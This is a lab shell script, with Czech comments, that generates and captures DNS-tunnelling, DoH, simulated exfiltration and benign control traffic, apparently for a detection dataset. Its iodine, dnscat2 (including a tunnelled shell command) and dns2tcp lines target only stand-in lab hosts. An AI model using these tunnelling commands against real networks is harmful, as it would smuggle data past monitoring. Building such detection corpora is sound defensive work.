# Klient tunelu/DoH/kontroly. $1 = režim (impl-krok17.md, dodatek D1), $2 = štítek relace (soubor pcap).
# Sám zachytává svůj provoz celého rozhraní (per-relace, čistý štítek); vše jen do labu.
# DUR = délka zátěže v s, SEED = seed sady (tempo a parametry v předem daném rozsahu).
MODE=$1; LABEL=${2:-$1}; DUR=${DUR:-150}
echo "nameserver 10.88.0.53" > /etc/resolv.conf
mkdir -p /out/pcapb
tcpdump -i eth0 -s 0 -n -w /out/pcapb/$LABEL.pcap -Z root >/dev/null 2>&1 &
CAP=$!
sleep 6
DOH="--doh-insecure --doh-url https://10.88.0.70/dns-query"
until_end() { [ "$(date +%s)" -lt "$END" ]; }
END=$(( $(date +%s) + DUR ))
case "$MODE" in
  iodine|iodine-txt|iodine-cname|iodine-mx|iodine-a)
    # tunel přímo na vlastní autoritativní iodined (10.88.0.21); -r = bez raw UDP režimu
    T=NULL
    case "$MODE" in iodine-txt) T=TXT;; iodine-cname) T=CNAME;; iodine-mx) T=MX;; iodine-a) T=A;; esac
    echo "nameserver 10.88.0.21" > /etc/resolv.conf
    iodine -f -r -T $T -P labpass 10.88.0.21 t1.lab.test >/tmp/iodine.log 2>&1 &
    sleep 12
    while until_end; do
      iperf3 -c 10.99.1.1 -t 30 -b 400k -l 900 >/dev/null 2>&1 || sleep 2
    done
    ;;
  dnscat|dnscat-txt|dnscat-cname|dnscat-mx|dnscat-aaaa)
    TY=""
    case "$MODE" in dnscat-txt) TY=",type=TXT";; dnscat-cname) TY=",type=CNAME";; dnscat-mx) TY=",type=MX";; dnscat-aaaa) TY=",type=AAAA";; esac
    while until_end; do
      timeout $(( END - $(date +%s) + 1 )) /opt/dnscat2/client/dnscat --dns "server=10.88.0.53,domain=t2.lab.test$TY" \
        --secret=labsecret --exec "sh -c 'head -c 1500000 /dev/urandom | base64'" >/dev/null 2>&1 || sleep 2
    done
    ;;
  dns2tcp)
    # přímo na vlastní autoritu (10.88.0.23): přes unbound se relace nenaváže (ladicí běh B5,
    # klient opakuje jen „auth“); stejně jako iodine
    echo "nameserver 10.88.0.23" > /etc/resolv.conf
    dns2tcpc -z t3.lab.test -r web -l 8080 10.88.0.23 >/tmp/dns2tcp.log 2>&1 &
    sleep 4
    while until_end; do
      curl -s -m 60 -o /dev/null -H "Host: web.lab.test" http://127.0.0.1:8080/blob || sleep 2
    done
    ;;
  exfil-slow|exfil-short|exfil-multi|control-av|control-avburst|control-names|control-mdns)
    python3 /lab/dnsgen.py "$MODE" "$DUR"
    ;;
  doh)
    # DoH s novým spojením na každé vyhledání (každý curl je nový proces); cíle web a web2
    while until_end; do
      curl -s -k $DOH -o /dev/null https://web.lab.test/ 2>/dev/null
      curl -s -k $DOH -o /dev/null https://files.lab.test/ 2>/dev/null
      sleep 0.3
    done
    ;;
  doh-keep)
    # jeden curl, trvalé spojení na DoH, náhodná jména (každé = nové vyhledání), 2 přenosy/s
    URLS=""
    for n in $(seq 1 $(( DUR * 2 ))); do
      if [ $((n % 2)) -eq 0 ]; then URLS="$URLS https://h$n-$RANDOM.www.lab.test/"; else URLS="$URLS https://h$n-$RANDOM.www2.lab.test/"; fi
    done
    curl -s -k $DOH --rate 2/s $URLS >/dev/null 2>&1
    ;;
  control)
    while until_end; do
      host=$(printf 'web\napi\nfiles\nmail\nns\n' | sed -n "$((RANDOM%5+1))p")
      nslookup -type=A $host.lab.test 10.88.0.53 >/dev/null 2>&1
      nslookup -type=TXT lab.test 10.88.0.53 >/dev/null 2>&1
      curl -s -o /dev/null "http://web.lab.test/" 2>/dev/null
      sleep 0.2
    done
    ;;
  control-browse)
    while until_end; do
      curl -s -k -o /dev/null https://web.lab.test/ 2>/dev/null
      curl -s -k -o /dev/null https://files.lab.test/api 2>/dev/null
      curl -s -o /dev/null http://web.lab.test/ 2>/dev/null
      sleep 0.5
    done
    ;;
  control-download)
    while until_end; do curl -s -k -o /dev/null https://web.lab.test/blob 2>/dev/null || sleep 1; done
    ;;
  control-stream)
    while until_end; do curl -s -k --limit-rate 100k -m 80 -o /dev/null https://files.lab.test/blob 2>/dev/null || sleep 1; done
    ;;
  control-poll)
    while until_end; do curl -s -k -o /dev/null https://web.lab.test/api 2>/dev/null; sleep 1; done
    ;;
  control-pollkeep)
    URLS=""
    for n in $(seq 1 "$DUR"); do URLS="$URLS https://web.lab.test/api?n=$n"; done
    curl -s -k --rate 1/s $URLS >/dev/null 2>&1
    ;;
esac
sleep 3
kill $CAP 2>/dev/null
sleep 2
